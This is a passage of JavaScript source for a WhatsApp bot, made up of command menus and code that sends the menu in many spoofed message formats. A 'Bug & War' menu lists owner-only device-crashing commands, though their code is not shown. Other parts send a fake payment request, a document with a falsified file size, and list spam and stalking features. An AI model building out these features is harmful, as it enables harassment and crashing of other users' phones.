│${setv} ${prefix}*searchamime√*
│${setv} ${prefix}*animeinfo (to get anime id)√*
│${setv} ${prefix}*animedl (downlaod anime by id)√*
│${setv} ${prefix}*searchmanga√*
│${setv} ${prefix}*stickhandhold√*
│${setv} ${prefix}*stickshinobu√*
│${setv} ${prefix}*stickcuddle√*
│${setv} ${prefix}*stickhighfive√*
│${setv} ${prefix}*stickdance√*
│${setv} ${prefix}*stickcringe√*
│${setv} ${prefix}*stickhappy√*
│${setv} ${prefix}*stickglomp√*
│${setv} ${prefix}*sticksmug√*
│${setv} ${prefix}*stickblush√*
│${setv} ${prefix}*stickawoo√*
│${setv} ${prefix}*stickwave√*
│${setv} ${prefix}*sticksmile√*
│${setv} ${prefix}*stickslap√*
│${setv} ${prefix}*stickpoke√*
│${setv} ${prefix}*stickwink√*
│${setv} ${prefix}*stickbonk√*
│${setv} ${prefix}*stickbully√*
│${setv} ${prefix}*stickyeet√*
│${setv} ${prefix}*stickbike√*
│${setv} ${prefix}*stickkiss√*
│${setv} ${prefix}*sticklick√*
│${setv} ${prefix}*stickpat√*
│${setv} ${prefix}*stickhug√*
│${setv} ${prefix}*stickkill√*
│${setv} ${prefix}*stickcry√*
│${setv} ${prefix}*stickspank√*
│${setv} ${prefix}*sticktickle√*
│${setv} ${prefix}*traceanime√*
│${setv} ${prefix}*akira√*
│${setv} ${prefix}*akiyama√*
│${setv} ${prefix}*ana√*
│${setv} ${prefix}*asuna√*
│${setv} ${prefix}*ayuzawa√*
│${setv} ${prefix}*boruto√*
│${setv} ${prefix}*chiho√*
│${setv} ${prefix}*chitoge√*
│${setv} ${prefix}*cosplayloli√*
│${setv} ${prefix}*cosplaysagiri√*
│${setv} ${prefix}*deidara√*
│${setv} ${prefix}*doraemon√*
│${setv} ${prefix}*elaina√*
│${setv} ${prefix}*emilia√*
│${setv} ${prefix}*erza√*
│${setv} ${prefix}*gremory√*
│${setv} ${prefix}*hestia√*
│${setv} ${prefix}*husbu√*
│${setv} ${prefix}*inori√*
│${setv} ${prefix}*isuzu√*
│${setv} ${prefix}*itachi√*
│${setv} ${prefix}*itori√*
│${setv} ${prefix}*kaga√*
│${setv} ${prefix}*kagura√*
│${setv} ${prefix}*kakasih√*
│${setv} ${prefix}*kaori√*
│${setv} ${prefix}*keneki√*
│${setv} ${prefix}*kotori√*
│${setv} ${prefix}*kurumi√*
│${setv} ${prefix}*loli√*
│${setv} ${prefix}*loli2√*
│${setv} ${prefix}*madara√*
│${setv} ${prefix}*megumin√*
│${setv} ${prefix}*mikasa√*
│${setv} ${prefix}*mikey√*
│${setv} ${prefix}*miku√*
│${setv} ${prefix}*minato√*
│${setv} ${prefix}*naruto√*
│${setv} ${prefix}*neko√*
│${setv} ${prefix}*nekonime√*
│${setv} ${prefix}*nezuko√*
│${setv} ${prefix}*onepiece√*
│${setv} ${prefix}*pokemon√*
│${setv} ${prefix}*randomnime√*
│${setv} ${prefix}*randomnime2√*
│${setv} ${prefix}*rize√*
│${setv} ${prefix}*sagiri√*
│${setv} ${prefix}*sakura√*
│${setv} ${prefix}*sasuke√*
│${setv} ${prefix}*shina√*
│${setv} ${prefix}*shinka√*
│${setv} ${prefix}*shinomiya√*
│${setv} ${prefix}*shizuka√*
│${setv} ${prefix}*shota√*
│${setv} ${prefix}*tejina√*
│${setv} ${prefix}*toukachan√*
│${setv} ${prefix}*tsunade√*
│${setv} ${prefix}*waifu√*
│${setv} ${prefix}*waifu2√*
│${setv} ${prefix}*animewall√*
│${setv} ${prefix}*yotsuba√*
│${setv} ${prefix}*yuki√*
│${setv} ${prefix}*yulibocil√*
│${setv} ${prefix}*yumeko√*
│${setv} ${prefix}*8ball√*
│${setv} ${prefix}*animeawoo√*
│${setv} ${prefix}*animemegumin√*
│${setv} ${prefix}*animeshinobu√*
│${setv} ${prefix}*animehandhold√*
│${setv} ${prefix}*animehighfive√*
│${setv} ${prefix}*animecringe√*
│${setv} ${prefix}*animedance√*
│${setv} ${prefix}*animehappy√*
│${setv} ${prefix}*animeglomp√*
│${setv} ${prefix}*animeblush√*
│${setv} ${prefix}*animesmug√*
│${setv} ${prefix}*animewave√*
│${setv} ${prefix}*animesmille√*
│${setv} ${prefix}*animepoke√*
│${setv} ${prefix}*animewink√*
│${setv} ${prefix}*animebonk√*
│${setv} ${prefix}*animebully√*
│${setv} ${prefix}*animeyeet√*
│${setv} ${prefix}*animebite√*
│${setv} ${prefix}*animelick√*
│${setv} ${prefix}*animekill√*
│${setv} ${prefix}*animecry√*
│${setv} ${prefix}*animewlp√*
│${setv} ${prefix}*animekiss√*
│${setv} ${prefix}*animehug√*
│${setv} ${prefix}*animeneko√*
│${setv} ${prefix}*animepat√*
│${setv} ${prefix}*animeslap√*
│${setv} ${prefix}*animecuddle√*
│${setv} ${prefix}*animewaifu√*
│${setv} ${prefix}*animenom√*
│${setv} ${prefix}*animefoxgirl√*
│${setv} ${prefix}*animegecg√*
│${setv} ${prefix}*animetickle√*
│${setv} ${prefix}*animefeed√*
│${setv} ${prefix}*animeavatar√*
│${setv} ${prefix}*anime√*
│${setv} ${prefix}*avatar√*
│${setv} ${prefix}*shinobu√*
│${setv} ${prefix}*fox_girl√*
│${setv} ${prefix}*gecg√*
│${setv} ${prefix}*sendanimeid√*
│${setv} ${prefix}*animedl√*
│${setv} ${prefix}*mangaimg√*
│${setv} ${prefix}*animeimg√*
│${setv} ${prefix}*animeinfo√*
│${setv} ${prefix}*searchmanga√*
╰─┬────❍
╭─┴❍「 *Anime NSFW* 」❍
│ _Sorry USERS_
│ NO NSFW MENU AVAILABLE
╰─┬────❍
╭─┴❍「 *Database* 」❍
│${setv} ${prefix}*setcmd✓*
│${setv} ${prefix}*delcmd✓*
│${setv} ${prefix}*listcmd√*
│${setv} ${prefix}*lockcmd✓*
│${setv} ${prefix}*addmsg✓*
│${setv} ${prefix}*delmsg✓*
│${setv} ${prefix}*getmsg√*
│${setv} ${prefix}*listmsg√*
╰─┬────❍
╭─┴❍「 *Store* 」❍
│${setv} ${prefix}*list√*
│${setv} ${prefix}*store√*
│${setv} ${prefix}*shop√*
│${setv} ${prefix}*addlist✓*
│${setv} ${prefix}*dellist✓*
╰─┬────❍
╭─┴❍「 *Religon* 」❍
│${setv} ${prefix}*bible√*
│${setv} ${prefix}*quran√*
│${setv} ${prefix}*gita√*
│${setv} ${prefix}*namazchk√*
│${setv} ${prefix}*prophetname√*
│${setv} ${prefix}*prayertime√*
│${setv} ${prefix}*sahihbukhari√*
│${setv} ${prefix}*jamiattirmidhi√*
│${setv} ${prefix}*sunanannasai√*
│${setv} ${prefix}*sunanibnmajah√*
│${setv} ${prefix}*sunanabudawud√*
│${setv} ${prefix}*kisahnabi√*
│${setv} ${prefix}*asmaulhusna√*
│${setv} ${prefix}*duas√*
│${setv} ${prefix}*namaz√*
│${setv} ${prefix}*masnoonduas√*
│${setv} ${prefix}*ayatalkursi√*
│${setv} ${prefix}*niyatnamaz√*
│${setv} ${prefix}*quotesislami√*
│${setv} ${prefix}*assalamualaikum√*
╰─┬────❍
╭─┴❍「 *Bug & War* 」❍
│${setv} ${prefix}*techandroid✓*
│${setv} ${prefix}*techandroid2✓*
│${setv} ${prefix}*techios✓*
│${setv} ${prefix}*techios2✓*
│${setv} ${prefix}*systemuicrash✓*
│${setv} ${prefix}*techsysui✓*
│${setv} ${prefix}*darlingkill✓*
│${setv} ${prefix}*ioskill✓*
│${setv} ${prefix}*onekill✓*
│${setv} ${prefix}*xgcmem✓*
╰─┬────❍
╭─┴❍「 *Other* 」❍
│${setv} ${prefix}*update√*
│${setv} ${prefix}*cricket√*
│${setv} ${prefix}*score√*
│${setv} ${prefix}*ping√*
│${setv} ${prefix}*menu√*
│${setv} ${prefix}*myip√*
│${setv} ${prefix}*repo√*
│${setv} ${prefix}*reportbug√*
│${setv} ${prefix}*idgroup√*
│${setv} ${prefix}*owner√*
│${setv} ${prefix}*rentbot√*
│${setv} ${prefix}*donate√*
│${setv} ${prefix}*runtime√*
│${setv} ${prefix}*confess√*
│${setv} ${prefix}*react√*
│${setv} ${prefix}*q√*
│${setv} ${prefix}*inspect√*
│${setv} ${prefix}*tagme√*
│${setv} ${prefix}*nowa√*
│${setv} ${prefix}*truecaller√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/y0nLDSB/veran-IMG.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/y0nLDSB/veran-IMG.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"*Follow* 🌚\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"*Follow* 🌚\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
                {
    "name": "single_select",
    "buttonParamsJson": `{
        "title": "LIST MENU 📃",
        "sections": [
            {
                "title": "${botname}",
                "rows": [
                    {
                        "header": "ALL MENU",
                        "title": "Click to display",
                        "description": "Displays the list of all features",
                        "id": "${prefix}allmenu"
                    },
                    {
                        "header": "SEARCH MENU",
                        "title": "Click to display",
                        "description": "Displays the list of search features",
                        "id": "${prefix}searchmenu"
                    },
                    {
                        "header": "DOWNLOAD MENU",
                        "title": "Click to display",
                        "description": "Displays the list of download features",
                        "id": "${prefix}downloadmenu"
                    },
                    {
                        "header": "GAME MENU",
                        "title": "Click to display",
                        "description": "Displays the list of game features",
                        "id": "${prefix}gamemenu"
                    },
                    {
                        "header": "FUN MENU",
                        "title": "Click to display",
                        "description": "Displays the list of fun features",
                        "id": "${prefix}funmenu"
                    },
                    {
                        "header": "AI MENU",
                        "title": "Click to display",
                        "description": "Displays the list of AI features",
                        "id": "${prefix}aimenu"
                    },
                    {
                        "header": "GROUP MENU",
                        "title": "Click to display",
                        "description": "Displays the list of group management features",
                        "id": "${prefix}groupmenu"
                    }
                ]
            }
        ]
    }`
               },
               {

                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"*CHANNEL 👥 \",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'ownermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Owner* 」❍
│${setv} ${prefix}*alive/v✓*
│${setv} ${prefix}*addbadword✓*
│${setv} ${prefix}*delbadword✓*
│${setv} ${prefix}*autoread✓*
│${setv} ${prefix}*autobio✓*
│${setv} ${prefix}*autotype✓*
│${setv} ${prefix}*unavailable✓*
│${setv} ${prefix}*autorecord✓*
│${setv} ${prefix}*autorecordtype✓*
│${setv} ${prefix}*autostatusview✓*
│${setv} ${prefix}*setautoblock✓*
│${setv} ${prefix}*setantiforeign✓*
│${setv} ${prefix}*autoblock✓*
│${setv} ${prefix}*onlygc✓*
│${setv} ${prefix}*onlypc✓*
│${setv} ${prefix}*onlyindia✓*
│${setv} ${prefix}*onlyindo✓*
│${setv} ${prefix}*anticall✓*
│${setv} ${prefix}*self✓*
│${setv} ${prefix}*public✓*
│${setv} ${prefix}*join✓*
│${setv} ${prefix}*poll✓*
│${setv} ${prefix}*spam✓*
│${setv} ${prefix}*bc✓*
│${setv} ${prefix}*bcgroup✓*
│${setv} ${prefix}*setmenu✓*
│${setv} ${prefix}*setimgmenu✓*
│${setv} ${prefix}*setvidmenu✓*
│${setv} ${prefix}*setgifmenu✓*
│${setv} ${prefix}*setreply✓*
│${setv} ${prefix}*resethit✓*
│${setv} ${prefix}*resetuser✓*
│${setv} ${prefix}*creategc✓*
│${setv} ${prefix}*setexif✓*
│${setv} ${prefix}*getexif✓*
│${setv} ${prefix}*getautoblocknumber✓*
│${setv} ${prefix}*getantiforeignnumber✓*
│${setv} ${prefix}*userjid✓*
│${setv} ${prefix}*setbotbio✓*
│${setv} ${prefix}*delppbot✓*
│${setv} ${prefix}*shutdown✓*
│${setv} ${prefix}*setppbot✓*
│${setv} ${prefix}*addprem✓*
│${setv} ${prefix}*delprem✓*
│${setv} ${prefix}*addowner✓*
│${setv} ${prefix}*delowner✓*
│${setv} ${prefix}*addvn✓*
│${setv} ${prefix}*addapk✓*
│${setv} ${prefix}*addzip✓*
│${setv} ${prefix}*addpdf✓*
│${setv} ${prefix}*delapk✓*
│${setv} ${prefix}*delzip✓*
│${setv} ${prefix}*delpdf✓*
│${setv} ${prefix}*delvn✓*
│${setv} ${prefix}*addsticker✓*
│${setv} ${prefix}*delsticker✓*
│${setv} ${prefix}*addimage✓*
│${setv} ${prefix}*delimage✓*
│${setv} ${prefix}*addvideo✓*
│${setv} ${prefix}*delvideo✓*
│${setv} ${prefix}*upswtext✓*
│${setv} ${prefix}*upswvideo✓*
│${setv} ${prefix}*upswimage✓*
│${setv} ${prefix}*upswaudio✓*
│${setv} ${prefix}*autosticker✓*
│${setv} ${prefix}*block✓*
│${setv} ${prefix}*unblock✓*
│${setv} ${prefix}*leavegc✓*
│${setv} ${prefix}*pushcontact✓*
│${setv} ${prefix}*pushcontactv2✓*
│${setv} ${prefix}*pushcontactv3✓*
│${setv} ${prefix}*jpm✓*
│${setv} ${prefix}*checkmember✓*
│${setv} ${prefix}*post✓*
│${setv} ${prefix}*clearchat✓*
│${setv} ${prefix}*setprefix✓*
│${setv} ${prefix}*channel✓*
│${setv} ${prefix}*link✓*
│${setv} *$✓*
│${setv} *>✓*
│${setv} *<✓*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/Jf5Ca43.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/Jf5Ca43.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {

let msg =generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
